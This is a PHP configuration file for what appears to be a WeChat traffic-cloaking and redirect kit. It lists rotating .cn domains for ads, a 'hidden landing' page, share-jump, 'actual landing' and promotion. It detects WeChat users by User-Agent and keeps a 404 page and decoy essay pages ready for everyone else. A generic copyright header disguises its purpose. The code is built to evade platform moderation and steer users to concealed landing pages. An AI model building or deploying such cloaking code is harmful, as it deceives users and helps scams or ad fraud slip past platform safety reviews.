<?php
// vim: set expandtab cindent tabstop=4 shiftwidth=4 fdm=marker:
// +----------------------------------------------------------------------+
// | The CompanyName Inc                                                  |
// +----------------------------------------------------------------------+
// | Copyright (c) 2013, CompanyName Inc. All rights reserved.            |
// +----------------------------------------------------------------------+
// | Authors: The PHP Dev Team, ISRD, CompanyName Inc.                    |
// |                                                                      |
// +----------------------------------------------------------------------+


// 广告域名
$data ['gg_url'] = 'http://jedxc.cn/';

$luodi = array(
    //隐藏落地
    'http://ginedo.cn/',
);

$ld = $luodi[rand(0, count($luodi) - 1)];

$data['sp_url'] = $ld;//线落地域名

$data['sp_jump'] = 'http://zydvb.cn/';  // 分享跳转域名

$data['sp_sjluo'] = 'http://rhzewv71456.cn/';   // 实际落地

$data['sp_tuig'] = 'http://xpmslw86075.cn/';  // 推广域名

// $data['toopen'] = 'http://brwpby58983.cn/?blok=start';//切广告
// $data['toopen'] = 'http://vgb2ey.cn';//切免接口
include_once 'crypt.php';

$key = 'keythree';

$des = new StdDes();

$data['sp_prif'] = $des->authcode('act=swty&tip=start', '', $key, 600);

$iswx = isweixin();
$page = file_get_contents('404.html');

$black = false;
$wz    = array(
    '0' => 'sanwen/wenz1.html',
    '1' => 'sanwen/wenz2.html',
    '2' => 'sanwen/wenz3.html',
    '3' => 'sanwen/wenz4.html',
    '4' => 'sanwen/wenz5.html',
    '5' => 'sanwen/wenz6.html',
    '6' => 'sanwen/wenz7.html',
    '7' => 'sanwen/wenz8.html',
    '8' => 'sanwen/wenz9.html',
    '9' => 'sanwen/wenz10.html'
);
/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean   && false === stripos($_SERVER['HTTP_USER_AGENT'], 'wechatdevtools')
 */
function isweixin()
{
    if (array_key_exists('HTTP_USER_AGENT', $_SERVER) && strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') !== false) {
        # code...
        return true;
    }
    return false;
}

function getRandStr($length)
{
    $str = array_merge(range(0, 9), range('a', 'z'), range('A', 'Z'));
    shuffle($str);
    $str = implode('', array_slice($str, 0, $length));
    return $str;
}